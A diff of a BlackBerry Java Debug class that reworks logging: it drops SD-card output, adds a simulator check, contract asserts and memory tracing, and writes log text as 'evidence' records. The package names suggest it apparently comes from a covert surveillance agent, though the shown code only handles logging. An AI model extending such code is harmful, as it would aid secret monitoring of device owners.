@@ -13,13 +13,15 @@ import java.util.Date;
 
 import net.rim.device.api.i18n.DateFormat;
 import net.rim.device.api.system.Alert;
+import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.LED;
+import net.rim.device.api.system.Memory;
+import net.rim.device.api.system.MemoryStats;
 import net.rim.device.api.util.NumberUtilities;
-import blackberry.agent.Agent;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.config.Keys;
-import blackberry.crypto.Encryption;
 import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.Path;
 
 /**
@@ -33,7 +35,6 @@ public final class Debug {
     static Evidence logInfo;
 
     private static boolean logToDebugger;
-    private static boolean logToSD;
     private static boolean logToFlash;
     private static boolean logToEvents;
     private static boolean logToInfo;
@@ -121,23 +122,25 @@ public final class Debug {
             return false;
         }
 
-        Debug.logToDebugger = Conf.DEBUG_OUT;
-        Debug.logToSD = Conf.DEBUG_SD;
-        Debug.logToFlash = Conf.DEBUG_FLASH;
-        Debug.logToEvents = Conf.DEBUG_EVENTS;
-        Debug.logToInfo = Conf.DEBUG_INFO;
+        Debug.logToDebugger = Cfg.DEBUG_OUT;
+        Debug.logToFlash = Cfg.DEBUG_FLASH;
+        Debug.logToEvents = Cfg.DEBUG_EVENTS;
+        Debug.logToInfo = Cfg.DEBUG_INFO;
+
+        if (DeviceInfo.isSimulator()) {
+            Debug.logToFlash = false;
+        }
 
         debugWriter = DebugWriter.getInstance();
 
         Path.makeDirs();
 
-        debugWriter.initLogToFile(logToFlash, logToSD);
+        debugWriter.initLogToFile(logToFlash);
         debugWriter.initLogToEvents(logToEvents);
 
-        if (logToFlash || logToSD || logToEvents) {
+        if (logToFlash || logToEvents) {
             debugWriter.logToEvents = logToEvents;
-            debugWriter.logToFile = (logToFlash || logToSD);
-            debugWriter.logToSD = logToSD;
+            debugWriter.logToFile = (logToFlash);
 
             if (!debugWriter.isAlive()) {
                 debugWriter.start();
@@ -154,12 +157,18 @@ public final class Debug {
     public static synchronized void stop() {
         init = false;
         if (debugWriter != null) {
+            //#ifdef DBC
+            Check.asserts(debugWriter.isAlive(), "should be alive");
+            //#endif
             debugWriter.requestStop();
 
             try {
                 debugWriter.join();
             } catch (final InterruptedException e) {
             }
+            //#ifdef DBC
+            Check.asserts(!debugWriter.isAlive(), "shouldn't be alive");
+            //#endif
         }
     }
 
@@ -286,8 +295,8 @@ public final class Debug {
 
         //#ifdef DBC
         Check.requires(debugWriter != null, "logToFile: debugWriter null");
-        Check.requires(logToFlash || logToSD || logToEvents,
-                "! (logToFlash || logToSD || logToEvents )");
+        Check.requires(logToFlash || logToEvents,
+                "! (logToFlash ||  logToEvents )");
         //#endif
 
         boolean error = (priority <= DebugLevel.ERROR);
@@ -314,8 +323,7 @@ public final class Debug {
                 return;
             }
 
-            logInfo = new Evidence(Agent.AGENT_INFO, false, Encryption
-                    .getKeys().getAesKey());
+            logInfo = new Evidence(EvidenceType.INFO);
         }
 
         logInfo.atomicWriteOnce(message);
@@ -344,7 +352,7 @@ public final class Debug {
             return;
         }
 
-        if (logToSD || logToFlash || logToEvents) {
+        if (logToFlash || logToEvents) {
             final long timestamp = (new Date()).getTime();
             /*
              * Calendar calendar = Calendar.getInstance(); calendar.setTime(new
@@ -411,4 +419,19 @@ public final class Debug {
         }
     }
 
+    public void traceMemory() {
+        MemoryStats objects = Memory.getObjectStats();
+
+        Evidence.info("Memory STATS OBJECTS:  allocated="
+                + objects.getAllocated() + " free=" + objects.getFree()
+                + " numAllocated=" + objects.getObjectCount() + "  size="
+                + objects.getObjectSize());
+
+        /*objects = Memory.getRAMStats();
+        Evidence.info("Memory STATS RAM:  allocated=" + objects.getAllocated()
+                + " free=" + objects.getFree() + " numAllocated="
+                + objects.getObjectCount() + "  size="
+                + objects.getObjectSize());*/
+
+    }
 }
